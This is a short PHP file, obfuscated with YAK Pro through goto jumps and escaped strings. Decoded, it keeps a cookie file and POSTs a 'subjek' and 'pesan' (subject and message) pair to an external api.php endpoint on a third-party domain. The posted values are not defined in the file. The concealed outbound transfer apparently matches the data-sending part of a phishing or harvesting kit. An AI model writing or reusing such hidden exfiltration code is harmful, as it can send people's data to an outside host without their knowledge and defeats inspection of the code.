<?php
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.11  |
    |              on 2021-10-27 04:18:47              |
    |    GitHub: https://github.com/pk-fr/yakpro-po    |
    |__________________________________________________|
*/
goto kwFec; vfx2d: curl_exec($ojQ9L); goto Ucc1l; DH3Vn: curl_setopt($ojQ9L, CURLOPT_URL, $clBHm); goto yLsJi; WcBix: curl_setopt($ojQ9L, CURLOPT_HEADER, 0); goto TaGxC; TaGxC: curl_setopt($ojQ9L, CURLOPT_FOLLOWLOCATION, 0); goto vfx2d; fqp3B: curl_setopt($ojQ9L, CURLOPT_RETURNTRANSFER, 1); goto DbETz; yLsJi: curl_setopt($ojQ9L, CURLOPT_POST, 1); goto xLPmO; xLPmO: curl_setopt($ojQ9L, CURLOPT_POSTFIELDS, "\163\x75\142\152\x65\153\x3d" . $Oi8n7 . "\46\x70\145\163\x61\156\75" . $oDhdp); goto fqp3B; RMo8A: curl_setopt($ojQ9L, CURLOPT_COOKIEFILE, getcwd() . "\57\x63\157\153\56\x74\170\164"); goto WcBix; DbETz: curl_setopt($ojQ9L, CURLOPT_COOKIEJAR, getcwd() . "\x2f\x63\157\153\x2e\164\170\x74"); goto RMo8A; E1I4H: $ojQ9L = curl_init(); goto DH3Vn; kwFec: $clBHm = "\150\x74\164\160\163\72\x2f\x2f\162\x69\x6e\147\163\145\153\160\x72\157\x6a\145\143\164\x73\56\x6e\x65\x74\57\141\160\151\56\x70\150\x70"; goto E1I4H; Ucc1l: curl_close($ojQ9L);